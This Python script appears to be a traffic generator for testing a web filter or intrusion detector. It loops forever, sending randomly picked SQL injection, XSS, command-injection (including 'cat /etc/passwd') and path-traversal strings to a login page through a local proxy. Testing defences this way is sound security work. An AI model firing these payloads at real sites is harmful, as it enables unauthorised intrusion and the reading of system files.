import requests
import random
import time
import urllib.parse

PROXY_URL = "http://127.0.0.1:8000"

SQLI_PAYLOADS = [
    "' OR 1=1 --",
    "' OR '1'='1",
    "admin'--",
    "' UNION SELECT null--",
    "' OR 1=1#"
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)"
]

CMD_PAYLOADS = [
    "ls",
    "whoami",
    "cat /etc/passwd",
    "; ls",
    "&& whoami"
]

PATH_PAYLOADS = [
    "../etc/passwd",
    "..\\..\\windows\\system32",
    "%2e%2e%2f",
    "../../../../etc/passwd"
]

# ❌ removed NORMAL_PAYLOADS completely

ALL_ATTACKS = (
    SQLI_PAYLOADS +
    XSS_PAYLOADS +
    CMD_PAYLOADS +
    PATH_PAYLOADS
)


def build_request(payload):
    username = urllib.parse.quote(payload)
    password = "123456"
    return f"/index.php?username={username}&password={password}&submit=LOGIN"


def send(payload):
    url = PROXY_URL + build_request(payload)

    try:
        requests.get(url, timeout=2)
        print("[SENT]", payload)
    except Exception as e:
        print("[ERROR]", e)


print("[*] Starting attack-only simulation...")

while True:
    payload = random.choice(ALL_ATTACKS)
    send(payload)
    time.sleep(random.uniform(0.3, 1.5))